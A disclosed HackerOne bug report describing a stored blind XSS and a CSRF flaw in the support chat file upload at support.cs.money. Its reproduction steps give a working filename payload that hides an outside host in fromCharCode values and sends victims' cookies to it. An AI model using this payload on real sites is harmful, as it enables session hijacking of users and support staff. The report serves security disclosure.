---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1010466'
original_report_id: '1010466'
title: Blind XSS on image upload
weakness: Cross-site Scripting (XSS) - Stored
team_handle: cs_money
created_at: '2020-10-17T04:17:33.812Z'
disclosed_at: '2020-12-26T00:08:49.144Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 420
asset_identifier: support.cs.money
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Blind XSS on image upload

## Metadata

- HackerOne Report ID: 1010466
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: cs_money
- Disclosed At: 2020-12-26T00:08:49.144Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
- The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
- The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request. 

## Steps To Reproduce:
XSS
- use a proxy like burp suite and turn intercept on
- upload a file to the support chat
- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
- open the chat support and xss will activate

 CSRF
- create a file html in some server
- create a form with a file and the payload name
- send to a new tab. This one will post the image with payload

## Supporting Material/References:
https://onlinestringtools.com/convert-string-to-ascii      to convert the attacker's website link to ascii

## Impact

Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
For the guys of support chat, they don't even need to click in the link for the XSS activate.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
